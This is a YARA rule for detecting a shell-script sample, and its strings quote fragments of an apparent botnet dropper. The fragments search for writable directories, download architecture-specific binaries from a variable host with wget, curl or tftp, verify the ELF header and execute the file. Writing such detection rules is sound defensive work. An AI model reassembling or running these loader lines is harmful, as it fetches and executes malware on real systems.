rule SCRIPT_Sample_Unique_5ecff0a7
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "5ecff0a7ad9d48b97487032014fd620ccf49a53f7a48a0fa6e0bdd1ef7787dd6"
        yarahub_uuid = "cf8f2a6c-6130-4089-8c62-ab125c799d75"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1b92085109384a13eef3d02d855cc496"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "aarch64|armv8*)    A=arm7 ;;" ascii
        $s1 = "for d in /var/tmp /dev/shm /tmp /var/run /root /mnt /; do" ascii
        $s2 = "if cd \"$d\" 2>/dev/null && touch .w$$ 2>/dev/null; then" ascii
        $s3 = "printf 'exit 0\\n' > .x$$ 2>/dev/null" ascii
        $s4 = "chmod +x .x$$ 2>/dev/null" ascii
        $s5 = "\"./.x$$\" >/dev/null 2>&1" ascii
        $s6 = "if [ -z \"$D\" ]; then" ascii
        $s7 = "for a in arm7 arm6 arm5 arm4 mips mpsl x86_64 x86; do" ascii
        $s8 = "wget -q -O \"$F\" \"http://$H/$a\" 2>/dev/null ||" ascii
        $s9 = "curl -s -m 10 -o \"$F\" \"http://$H/$a\" 2>/dev/null ||" ascii
        $s10 = "tftp -g -l \"$F\" -r \"$a\" \"$H\" 2>/dev/null" ascii
        $s11 = "[ -s \"$F\" ] || continue" ascii
        $s12 = "if command -v od >/dev/null 2>&1; then" ascii
        $s13 = "M=\"$(head -c 4 \"$F\" 2>/dev/null | od -An -tx1 | tr -d ' \\n')\"" ascii
        $s14 = "if [ -n \"$M\" ] && [ \"$M\" != \"7f454c46\" ]; then" ascii
        $s15 = "chmod +x \"$F\" 2>/dev/null" ascii
        $s16 = "\"./$F\" \"$T\" >/dev/null 2>&1" ascii
        $s17 = "if [ $? -eq 0 ]; then" ascii
        $s18 = "if [ -z \"$STARTED\" ]; then" ascii
        $s19 = "2>/dev/null | od -An -tx1 | tr -d" ascii
    condition:
        true and filesize < 50MB and 3 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
